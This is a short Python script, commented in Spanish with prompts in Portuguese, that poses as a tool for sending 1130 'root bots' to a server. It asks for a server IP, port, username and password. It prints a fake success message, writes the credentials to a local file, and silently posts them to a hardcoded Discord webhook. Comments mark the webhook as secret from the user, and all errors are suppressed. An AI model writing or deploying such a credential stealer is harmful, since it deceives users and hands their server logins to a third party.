import requests
from colorama import init, Fore

# Inicializa colorama
init(autoreset=True)

# Webhook de Discord (secreta, no se menciona al usuario)
webhook_url = "https://discord.com/api/webhooks/1367321749414219808/_-p9bdmXS5j_AEkeqyq-4HWXoNr3V8g8_zmh1YZC4_L2YsPRxhzdUyDU1YtPBixpTKUh"

# Bloque de inputs
ip = input("Solicite a IP do servidor para passar os bots: ")
porta = input("Digite a porta do servidor: ")
usuario = input("Digite o usuário: ")
senha = input("Digite a senha: ")

# Mostrar mensaje como si fuera solo una operación de bots
print(Fore.GREEN + f"\n1130 bots root passados com sucesso para o servidor {ip}:{porta}!")
print(Fore.GREEN + "Bots: 1130\n")

# Guarda localmente los datos
with open("hola.txt", "w") as arquivo:
    arquivo.write(f"IP: {ip}\n")
    arquivo.write(f"Porta: {porta}\n")
    arquivo.write(f"Usuário: {usuario}\n")
    arquivo.write(f"Senha: {senha}\n")
    arquivo.write("Bots: 1130\n")

# Envío silencioso al webhook
payload = {
    "content": f"IP: {ip}\nPorta: {porta}\nUsuário: {usuario}\nSenha: {senha}\nBots: 1130"
}
try:
    requests.post(webhook_url, json=payload)
except:
    pass  # No mostrar errores ni actividad
